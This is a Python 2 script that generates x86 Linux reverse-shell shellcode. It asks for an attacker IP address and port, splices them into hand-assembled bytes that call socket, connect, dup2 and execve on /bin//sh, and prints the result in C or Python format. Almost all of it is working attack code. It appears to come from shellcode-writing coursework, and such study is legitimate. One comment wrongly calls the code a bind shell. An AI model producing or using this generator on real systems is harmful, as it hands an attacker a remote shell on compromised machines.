port = raw_input("Enter TCP Port Number: ")
deciPort = int(port)  # string to int
hexPort = "{:02x}".format(deciPort)  # int to hex
hexStrLen = len(hexPort)
oddEven = hexStrLen % 2  # string length even or odd?
if oddEven == 1:  # if odd, add a leading 0
    hexPort = "0" + hexPort
# convert the port number into the correct hex format
tcpPort = "\\x".join(hexPort[i : i + 2] for i in range(0, len(hexPort), 2))
print "Your TCP Port in Hex is:", "\\x" + tcpPort
nullCheck = deciPort % 256
if nullCheck == 0:
    print "Your TCP Port contains a Null 0x00."
    print "Try again with a different Port Number."
    exit(0)
ipAddrStr = raw_input("Enter IP Address [127.1.1.1]: ")
if ipAddrStr == "":
    ipAddrStr = "127.1.1.1"
formatIP = ipAddrStr.split(".")
hexIP = "{:02x}{:02x}{:02x}{:02x}".format(*map(int, formatIP))
# converts the ip address into the correct hex format
ipAddr = "\\x".join(hexIP[i : i + 2] for i in range(0, len(hexIP), 2))
print "Your IP Address in Hex is:", "\\x" + ipAddr

## Shellcode
scPart1 = "\x31\xc0"  # xor eax, eax
scPart1 += "\xb0\x66"  # mov al, 0x66   ; EAX = 0x66 = SYSCALL 102 - socketcall
scPart1 += "\x31\xdb"  # xor ebx, ebx

scPart1 += "\x43"  # inc ebx        ; EBX = 0x1 = socket() // Create a socket
scPart1 += "\x31\xc9"  # xor ecx, ecx
scPart1 += "\x51"  # push ecx
scPart1 += "\x53"  # push ebx
scPart1 += "\x6a\x02"  # push dword 0x2 ; AF_INET.
scPart1 += "\x89\xe1"  # mov ecx, esp
scPart1 += "\xcd\x80"  # int 0x80       ; System Call Interrupt 0x80 - Executes socket().
scPart1 += "\x96"  # xchg esi, eax  ; socket file descriptor returned to EAX Register, save in ESI
scPart1 += "\x31\xc0"  # xor eax, eax
scPart1 += "\x43"  # inc ebx
scPart1 += "\x68"  # push dword
# ipAddr = "\x7f\x01\x01\x01" # IP 127.1.1.1
scPart2 = "\x66\x68"  # Push Word
# tcpPort = "\x05\x39" # TCP Port 1337
scPart3 = "\x66\x53"  # push bx        ; 0x2 = AF_INET.
scPart3 += "\x89\xe1"  # mov ecx, esp
scPart3 += (
    "\x6a\x10"  # push 0x10      ; Length of SockAddr Struct is 16 bytes long
)
scPart3 += "\x51"  # push ecx
scPart3 += "\x56"  # push esi       ; socket file descriptor
scPart3 += (
    "\x89\xe1"  # mov ecx, esp   ; Point ECX to the top of the loaded stack.
)
scPart3 += (
    "\x43"  # inc ebx        ; Connect() value for the socketcall() SYSCAL
)
scPart3 += "\xb0\x66"  # mov al, 0x66   ; socketcall() system call
scPart3 += "\xcd\x80"  # int 0x80       ; System Call Interrupt 0x80
scPart3 += "\x87\xde"  #  xchg ebx, esi
scPart3 += "\x31\xc9"  # xor ecx, ecx
# dup2loop:
scPart3 += (
    "\xb0\x3f"  # mov al, 0x3f   ; EAX Syscall dup2() for STDIN STDOUT STDERR
)
scPart3 += "\xcd\x80"  # int 0x80       ; execute dup2()
scPart3 += "\x41"  # inc ecx
scPart3 += "\x80\xf9\x04"  # cmp cl, 0x4; compare cl to 4, if it is 4 the flag will be set
scPart3 += (
    "\x75\xf6"  # jne dup2loop   ; Jumps to the specified location flag is set
)
scPart3 += "\x31\xd2"  # xor edx, edx
scPart3 += "\x52"  # push edx
scPart3 += "\x68\x2f\x2f\x73\x68"  # push 0x68732f2f ; "hs//"
scPart3 += "\x68\x2f\x62\x69\x6e"  # push 0x6e69622f ; "nib/"
scPart3 += "\x89\xe3"  # mov ebx, esp   ; point ebx to stack
scPart3 += "\xb0\x0b"  # mov al, 0xb    ; execve syscall
scPart3 += "\x31\xc9"  # xor ecx, ecx
scPart3 += "\xcd\x80"  # int 0x80       ; execute execve

shellcode = ""

# Add the first part of the tcp bind shellcode
for x in bytearray(scPart1):
    shellcode += "\\x"
    shellcode += "%02x" % x
# Add the user input id address to the shellcode
shellcode += "\\x" + ipAddr
# Add the second part of the tcp bind shellcode
for x in bytearray(scPart2):
    shellcode += "\\x"
    shellcode += "%02x" % x
# Add the user added tcp port to the shellcode
shellcode += "\\x" + tcpPort
# Add the third part of the tcp bind shellcode
for x in bytearray(scPart3):
    shellcode += "\\x"
    shellcode += "%02x" % x

print "Choose your shellcode export format."
exportFormat = raw_input("[1] = C Format\n[2] = Python Format\n[1]: ")
if exportFormat == "2":
    formatSC = '"\nshellcode += "'.join(
        shellcode[i : i + 48] for i in range(0, len(shellcode), 48)
    )
    print "[-----------------------Your-Shellcode------------------------]"
    print 'shellcode = "' + formatSC + '"'
else:
    formatSC = '"\n"'.join(
        shellcode[i : i + 48] for i in range(0, len(shellcode), 48)
    )
    print "[----------------Your-Shellcode------------------]"
    print 'unsigned char shellcode[] = \\\n"' + formatSC + '";'
